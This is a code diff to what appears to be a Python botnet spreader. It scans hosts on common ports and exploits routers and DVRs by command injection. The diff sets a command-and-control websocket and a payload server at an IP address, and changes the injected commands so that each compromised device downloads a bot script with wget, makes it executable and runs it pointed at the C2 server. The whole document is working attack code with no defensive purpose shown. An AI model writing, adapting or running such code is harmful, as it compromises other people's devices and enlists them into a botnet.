@@ -14,7 +14,6 @@ import random
 import threading
 import concurrent.futures
 from queue import Queue
-from urllib.parse import urlparse
 import ipaddress
 
 # =============================================================================
@@ -22,8 +21,8 @@ import ipaddress
 # =============================================================================
 CNC_WS_URL = os.environ.get('CNC_WS_URL', 'ws://54.234.46.3:8765')
 PAYLOAD_SERVER = os.environ.get('PAYLOAD_SERVER', 'http://54.234.46.3:8080')
-PAYLOAD_URL = f"{PAYLOAD_SERVER}/bot"          # The bot binary/script to download
-PAYLOAD_NAME = "bot"                            # Name after download
+PAYLOAD_URL = f"{PAYLOAD_SERVER}/bot.py"        # The bot script to download
+PAYLOAD_NAME = "bot.py"                           # Name after download
 
 # Ports to scan (add more as needed)
 SCAN_PORTS = [80, 8080, 443, 23, 22]
@@ -98,8 +97,7 @@ def fiber_exploit(ip, port, username, password):
             conn.connect((ip, port))
 
             # Build payload with command injection
-            # The original uses wget to download a binary; we point to our PAYLOAD_URL
-            cmd = f"rm -rf /var/tmp/wlancont; wget {PAYLOAD_URL} -O /var/tmp/wlancont; chmod 777 /var/tmp/wlancont; /var/tmp/wlancont {CNC_WS_URL}"
+            cmd = f"rm -rf /var/tmp/wlancont; wget {PAYLOAD_URL} -O /var/tmp/wlancont; chmod 777 /var/tmp/wlancont; python /var/tmp/wlancont {CNC_WS_URL}"
             # Encode the command for URL (space = %20, etc.) – but the original uses raw ; in POST data
             # We'll keep the same format as fiber.py
             payload_body = (f"target_addr=%3B{cmd}%3Becho%%20DONE&waninf=1_INTERNET_R_VID_")
@@ -264,7 +262,7 @@ def dvr_check_and_exploit(ip, port):
 
         # Step 3: Attempt exploit on vulnerable paths
         user, pwd, auth_b64 = auth
-        cmd = f"cd /tmp || cd /run || cd /; wget {PAYLOAD_URL}; chmod 777 {PAYLOAD_NAME}; ./{PAYLOAD_NAME} {CNC_WS_URL}"
+        cmd = f"cd /tmp || cd /run || cd /; wget {PAYLOAD_URL} -O {PAYLOAD_NAME}; chmod 777 {PAYLOAD_NAME}; python {PAYLOAD_NAME} {CNC_WS_URL}"
         for path in DVR_PATHS:
             try:
                 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conn:
